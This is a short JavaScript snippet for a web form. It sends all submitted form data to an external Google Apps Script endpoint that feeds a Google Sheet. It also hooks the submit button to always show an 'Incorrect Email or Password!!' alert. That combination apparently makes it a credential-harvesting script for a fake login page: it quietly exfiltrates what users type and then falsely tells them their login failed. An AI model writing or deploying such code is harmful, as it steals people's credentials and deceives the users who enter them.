const scriptURL = "https://script.google.com/macros/s/AKfycbx_vr02eYQj64MegW5HGUnNtORfF6T6RKCKgJ4f7n7s41oJawj3IiQHOCKZtHZUKm0j/exec";
const form = document.forms["submit-to-google-sheet"];
const msg = document.getElementById("msg");
form.addEventListener("submit", (e) => {
  e.preventDefault();
  fetch(scriptURL, { method: "POST", body: new FormData(form) })
    .then((response) => {
      msg.innerHTML = "Message Sent To The ADMIN";
      setTimeout(function () {
        msg.innerHTML = "";
      }, 4000);
      form.reset();
    })
    .catch((error) => console.error("Error!", error.message));
    document.getElementById("btnSubmit").addEventListener("click", function() {
        alert("Incorrect Email or Password!!");
      }); 
});